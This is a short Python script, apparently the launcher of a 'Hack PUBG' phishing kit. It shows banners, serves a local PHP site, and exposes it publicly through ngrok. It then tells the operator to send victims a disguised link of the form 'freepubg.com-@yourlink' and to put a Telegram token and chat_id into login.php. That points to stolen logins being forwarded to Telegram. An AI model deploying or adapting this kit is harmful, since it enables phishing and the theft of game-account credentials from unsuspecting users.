import os
from colorama import Fore
import time
from pyngrok import ngrok
from subprocess import Popen
print(Fore.GREEN)
os.system("clear")

print(Fore.RED+"""



.-. .-.  .--.   .---. .-. .-.
| {_} | / {} \ /  ___}| |/ / 
| { } |/  /\  \\     }| |\ \ 
`-' `-'`-'  `-' `---' `-' `-'




""")
time.sleep(3)
os.system("clear")
print(Fore.GREEN+"""

                   
 _____     _       
|  _  |_ _| |_ ___ 
|   __| | | . | . |
|__|  |___|___|_  |
              |___|




""")
time.sleep(3)
os.system("clear")
print(Fore.CYAN+"""



 __    __       ___       ______  __  ___    .______    __    __  .______     _______ 
|  |  |  |     /   \     /      ||  |/  /    |   _  \  |  |  |  | |   _  \   /  _____|
|  |__|  |    /  ^  \   |  ,----'|  '  /     |  |_)  | |  |  |  | |  |_)  | |  |  __  
|   __   |   /  /_\  \  |  |     |    <      |   ___/  |  |  |  | |   _  <  |  | |_ | 
|  |  |  |  /  _____  \ |  `----.|  .  \     |  |      |  `--'  | |  |_)  | |  |__| | 
|__|  |__| /__/     \__\ \______||__|\__\    | _|       \______/  |______/   \______| 
                                                                                      
  _____________________
  •https://github.com/Mobin-Dan
  •t.me/termux_learning
  *on hotspot** 
   ____________________

""")
re =input("(port):")
with open("server","w") as phplog:
    Popen(("php","-S","localhost:"+re),stderr=phplog ,stdout=phplog)
link=ngrok.connect(re,"http")
print(link)
print(Fore.GREEN+" youcan send link: https://freepubg.com-@yourlink")
print(Fore.GREEN+"just edit login.php (token and chat_id)")
input("")
